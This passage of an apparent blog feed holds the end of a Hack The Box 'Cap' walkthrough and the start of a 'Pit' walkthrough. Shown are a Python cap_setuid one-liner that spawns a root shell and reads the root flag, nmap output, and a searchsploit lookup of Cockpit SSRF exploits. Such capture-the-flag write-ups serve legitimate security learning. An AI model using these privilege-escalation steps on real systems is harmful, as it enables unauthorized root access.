/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
</code></pre></div></div>

<p>The most interesting file was <code class="language-plaintext highlighter-rouge">/usr/bin/python3.8</code> that has the <code class="language-plaintext highlighter-rouge">cap_setuid</code> capability set, which, according to <a href="https://gtfobins.github.io/gtfobins/python/#capabilities">python | GTFOBins</a> it can be exploited by changing the uid of the session using the command below, spanning another instance of <code class="language-plaintext highlighter-rouge">/bin/sh</code> and, from it, was able to read <code class="language-plaintext highlighter-rouge">root</code>’s flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nathan@cap:~<span class="nv">$ </span>/usr/bin/python3.8 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/sh")'</span>
<span class="c"># id &amp;&amp; hostname &amp;&amp; cat /root/root.txt</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
cap
&lt;redacted&gt;
</code></pre></div></div>

<p>I hope you guys have enjoyed it!</p>

<p>See you at the next post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Easy" /><category term="HTB Linux" /><summary type="html"><![CDATA[Hello guys! This week’s machine will be Cap, another easy-rated Linux box from Hack The Box, created by InfoSecJack.]]></summary></entry><entry><title type="html">Walktrough: HTB Pit</title><link href="https://davicruz.com/walkthrough/2021/09/htb-pit" rel="alternate" type="text/html" title="Walktrough: HTB Pit" /><published>2021-09-25T09:00:00-03:00</published><updated>2021-09-25T09:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/09/htb-pit</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/09/htb-pit"><![CDATA[<p>Hello guys!</p>

<p>This week’s machine will be <strong>Pit</strong>, another medium-rated Linux box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/159204">polarbearer</a> and <a href="https://app.hackthebox.eu/users/125033">GibParadox</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>

<p><img src="https://i.imgur.com/pFwxqgv.png" alt="HTB Pit" class="align-center" /></p>

<p>This box was pretty different from the others as required some UDP enumeration, not often necessary but always useful when you’re at a dead-end :smile:. SNMP was key to enumerating and privesc this box, which had greater complexity once had SELinux enabled and didn’t allow an interactive shell until we get valid credentials to the system, connect via SSH and escalate privileges.</p>

<h2 id="enumeration">Enumeration</h2>

<p>As usual, started by running a <code class="language-plaintext highlighter-rouge">nmap</code> quick scan to see which services are currently published</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.241
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.                                 Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 12:15 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.241
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 filtered ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span class="o">(</span>RSA<span class="o">)</span>
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http            nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page <span class="k">for </span>the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;title&gt;
|     request
|     &lt;/title&gt;
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=utf-8"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
|     &lt;style&gt;
|     body <span class="o">{</span>
|     margin: 0<span class="p">;</span>
|     font-family: <span class="s2">"RedHatDisplay"</span>, <span class="s2">"Open Sans"</span>, Helvetica, Arial, sans-serif<span class="p">;</span>
|     font-size: 12px<span class="p">;</span>
|     line-height: 1.66666667<span class="p">;</span>
|     color: <span class="c">#333333;</span>
|     background-color: <span class="c">#f5f5f5;</span>
|     border: 0<span class="p">;</span>
|     vertical-align: middle<span class="p">;</span>
|     font-weight: 300<span class="p">;</span>
|_    margin: 0 0 10p
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dms-pit.htb/organizationName<span class="o">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class="o">=</span>US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2020-04-16T23:29:12
|_Not valid after:  2030-06-04T16:09:12
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V<span class="o">=</span>7.91%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>8/10%Time<span class="o">=</span>61129849%P<span class="o">=</span>x86_64-pc-linux-gn
SF:u%r<span class="o">(</span>GetRequest,E70,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\r\n</span><span class="s2">Content-Type:
SF:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf8</span><span class="se">\r\n</span><span class="s2">Transfer-Encoding:</span><span class="se">\x</span><span class="s2">20chunked</span><span class="se">\r\n</span><span class="s2">X-DN
SF:S-Prefetch-Control:</span><span class="se">\x</span><span class="s2">20off</span><span class="se">\r\n</span><span class="s2">Referrer-Policy:</span><span class="se">\x</span><span class="s2">20no-referrer</span><span class="se">\r\n</span><span class="s2">X-Cont
SF:ent-Type-Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">Cross-Origin-Resource-Policy:</span><span class="se">\x</span><span class="s2">20same-o
SF:rigin</span><span class="se">\r\n\r\n</span><span class="s2">29</span><span class="se">\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
SF:&lt;title&gt;</span><span class="se">\r\n</span><span class="s2">b</span><span class="se">\r\n</span><span class="s2">Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\r\n</span><span class="s2">d08</span><span class="se">\r\n</span><span class="s2">&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;met
SF:a</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">Content-Type</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">text/html;</span><span class="se">\x</span><span class="s2">20charset=utf
SF:-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=de
SF:vice-width,</span><span class="se">\x</span><span class="s2">20initial-scale=1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;style&gt;</span><span class="se">\n\t</span><span class="s2">body</span><span class="se">\x</span><span class="s2">
SF:20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20margin:</span><span class="se">\x</span><span class="s2">200;</span><span class="se">\n\x</span><span class="s2">2
SF:0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20font-family:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">RedHatDi
SF:splay</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">Open</span><span class="se">\x</span><span class="s2">20Sans</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20Helvetica,</span><span class="se">\x</span><span class="s2">20Arial,</span><span class="se">\x</span><span class="s2">20sans-serif;</span><span class="se">\n\</span><span class="s2">
SF:x20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20font-size:</span><span class="se">\x</span><span class="s2">2012px;</span><span class="se">\n\x</span><span class="s2">2
SF:0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20line-height:</span><span class="se">\x</span><span class="s2">201</span><span class="se">\.</span><span class="s2">6666666
SF:7;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20color:</span><span class="se">\x</span><span class="s2">20#333333;</span><span class="se">\</span><span class="s2">
SF:n</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20background-color:</span><span class="se">\x</span><span class="s2">20#
SF:f5f5f5;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20}</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
SF:0</span><span class="se">\x</span><span class="s2">20img</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20border:</span><span class="se">\</span><span class="s2">
SF:x200;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20vertical-align:</span><span class="se">\</span><span class="s2">
SF:x20middle;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20}</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20h1</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20font-w
SF:eight:</span><span class="se">\x</span><span class="s2">20300;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20}</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20p</span><span class="se">\x</span><span class="s2">20{</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20mar
SF:gin:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">2010p"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,E70,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20r
SF:equest</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf8</span><span class="se">\r\n</span><span class="s2">Transfer-Encod
SF:ing:</span><span class="se">\x</span><span class="s2">20chunked</span><span class="se">\r\n</span><span class="s2">X-DNS-Prefetch-Control:</span><span class="se">\x</span><span class="s2">20off</span><span class="se">\r\n</span><span class="s2">Referrer-Policy:</span><span class="se">\x</span><span class="s2">
SF:20no-referrer</span><span class="se">\r\n</span><span class="s2">X-Content-Type-Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">Cross-Origin-Res
SF:ource-Policy:</span><span class="se">\x</span><span class="s2">20same-origin</span><span class="se">\r\n\r\n</span><span class="s2">29</span><span class="se">\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n</span><span class="s2">&lt;
SF:head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;</span><span class="se">\r\n</span><span class="s2">b</span><span class="se">\r\n</span><span class="s2">Bad</span><span class="se">\x</span><span class="s2">20request</span><span class="se">\r\n</span><span class="s2">d08</span><span class="se">\r\n</span><span class="s2">&lt;/title
SF:&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">Content-Type</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">te
SF:xt/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\</span><span class="s2">
SF:"</span><span class="se">\x</span><span class="nv">20content</span><span class="o">=</span><span class="se">\"</span><span class="nv">width</span><span class="o">=</span>device-width,<span class="se">\x</span>20initial-scale<span class="o">=</span>1<span class="se">\.</span>0<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>
SF:20<span class="se">\x</span>20&lt;style&gt;<span class="se">\n\t</span>body<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>2
SF:0<span class="se">\x</span>20margin:<span class="se">\x</span>200<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20fon
SF:t-family:<span class="se">\x</span>20<span class="se">\"</span>RedHatDisplay<span class="se">\"</span>,<span class="se">\x</span>20<span class="se">\"</span>Open<span class="se">\x</span>20Sans<span class="se">\"</span>,<span class="se">\x</span>20Helvetica,<span class="se">\x</span>20A
SF:rial,<span class="se">\x</span>20sans-serif<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20f
SF:ont-size:<span class="se">\x</span>2012px<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20lin
SF:e-height:<span class="se">\x</span>201<span class="se">\.</span>66666667<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
SF:<span class="se">\x</span>20color:<span class="se">\x</span>20#333333<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>2
SF:0background-color:<span class="se">\x</span>20#f5f5f5<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="o">}</span><span class="se">\n\x</span>20
SF:<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20img<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\</span>
SF:x20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20border:<span class="se">\x</span>200<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\</span>
SF:x20<span class="se">\x</span>20vertical-align:<span class="se">\x</span>20middle<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="o">}</span><span class="se">\n\</span>
SF:x20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20h1<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>2
SF:0<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20font-weight:<span class="se">\x</span>20300<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
SF:<span class="o">}</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20p<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
SF:<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20margin:<span class="se">\x</span>200<span class="se">\x</span>200<span class="se">\x</span>2010p<span class="s2">");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 213.97 seconds
</span></code></pre></div></div>

<p>Based on the information seen in the scan, noticed that the SSL certificate for this machine is <code class="language-plaintext highlighter-rouge">dms-pit.htb</code>, which was later added to the local hosts file.</p>

<h3 id="80tcp-and-9090tcp---http-services">80/TCP and 9090/TCP - HTTP Services</h3>

<p>Accessing the pages, we can see, for <code class="language-plaintext highlighter-rouge">http://10.10.10.241:80</code> the default <code class="language-plaintext highlighter-rouge">nginx</code> page while the <code class="language-plaintext highlighter-rouge">https://10.10.10.241:9090</code> displays a <a href="https://cockpit-project.org/">Cockpit Project — Cockpit Project (cockpit-project.org)</a> Login Page.</p>

<p><img src="https://i.imgur.com/ldyoAq7.png" alt="HTB Pit - Cockpit login page" class="align-center" /></p>

<p>Cockpit is a web-based administration interface for Linux Servers and, as the box’s name is part of the name of this solution, we might be on the right path :smile: .</p>

<p>Checking for vulnerabilities for this product, I have found an SSRF vulnerability in version 234 in <code class="language-plaintext highlighter-rouge">searchsploit</code> that we may be able to use once it doesn’t require any valid credentials.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit cockpit
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
 Exploit Title                                                        |  Path
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Cockpit CMS 0.4.4 &lt; 0.5.5 - Server-Side Request Forgery               | php/webapps/44567.txt
Cockpit CMS 0.6.1 - Remote Code Execution                             | php/webapps/49390.txt
Cockpit Version 234 - Server-Side Request Forgery <span class="o">(</span>Unauthenticated<span class="o">)</span>   | multiple/webapps/49397.txt
openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                    | php/webapps/47305.py
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Shellcodes: No Results

<span class="nv">$ </span><span class="nb">head</span> <span class="si">$(</span>locate  multiple/webapps/49397.txt<span class="si">)</span>
<span class="c"># Exploit Title: Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)</span>
<span class="c"># Date: 08.01.2021</span>
<span class="c"># Exploit Author: Metin Yunus Kandemir</span>
<span class="c"># Vendor Homepage: https://cockpit-project.org/</span>
<span class="c"># Version: v234</span>
<span class="c"># Tested on: Ubuntu 18.04</span>

<span class="c">#!/usr/bin/python3</span>
import argparse
import requests
</code></pre></div></div>

<p>Reading about this vulnerability on <a href="https://github.com/passtheticket/vulnerability-research/blob/main/cockpitProject/README.md">this Github page</a> we can use this to enumerate and access contents we might not be allowed from other hosts, which could be useful later but, at this moment, won’t help much.</p>

<p>Proceeding with the enumeration, now using <code class="language-plaintext highlighter-rouge">whatweb</code> to speed things a little, I have created a simple bash script to loop to each host and port available, giving us some idea of what we might have published in this system</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">declare</span> <span class="nt">-a</span> <span class="nv">hosts</span><span class="o">=(</span><span class="s2">"10.10.10.241"</span> <span class="s2">"pit.htb"</span> <span class="s2">"dms-pit.htb"</span><span class="o">)</span><span class="p">;</span>
<span class="nb">declare</span> <span class="nt">-a</span> <span class="nv">ports</span><span class="o">=(</span><span class="s2">"80"</span> <span class="s2">"9090"</span><span class="o">)</span><span class="p">;</span>

<span class="k">for </span>host <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">hosts</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
        for </span>port <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">ports</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
